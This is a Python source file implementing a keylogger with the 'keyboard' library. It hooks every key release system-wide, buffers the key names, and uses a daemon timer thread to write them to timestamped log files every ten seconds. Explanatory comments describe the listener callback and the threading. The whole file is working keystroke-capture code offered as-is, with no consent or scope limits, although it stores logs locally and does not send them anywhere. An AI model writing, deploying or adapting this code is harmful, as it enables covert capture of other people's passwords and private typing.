import keyboard
from threading import Timer
import time

class Keylogger:
    def __init__(self, time):
        self.log = ''
        self.counter = 1
        self.interval = time
   

    def callback(self, event):
        '''
            there is a global listener that gets activated when we call on a function such as
            on_press which then  activates the listener. At this point we have a callback 
            and I am custom making that callback function so that the listener knows where
            to point to. The event callback has three attributes which are: name, scan_code
            (the ascii dec number for the char), time (timestamp)
        '''
        
        
        
        
        self.log += event.name



    
    def logging(self):
        if self.log:
            self.track()

        self.log = ''
        # we use the Timer from threading for when we want to have a function run after
        # a certain time frame
        '''
            This is a Daemon thread which means that when we first run the run() which has the 
            self.logging() call, we will create a sub-process that will run in the background.
            
            On each call to the same self.logging() we are checking to see if the log is empty
            or not, if it is not empty then we create a file via the track() and then we run
            the sub-process again to then run the track() again and keep recording log files
        '''
        timer = Timer(interval=self.interval, function=self.logging)
        timer.daemon = True
        timer.start()


    def track(self): 
        with open(f"log{self.counter}-{time.time()}.txt", "w") as f:
            f.write(self.log)

        print(f"Logged {self.counter} files\n")
        self.counter += 1

    def run(self):
        keyboard.on_release(callback=self.callback)
        self.logging()
        keyboard.wait() #causes a wait until we do ctl-c


if __name__ == "__main__":
    kl = Keylogger(time=10) # every 10 seconds we make a log file
    kl.run()
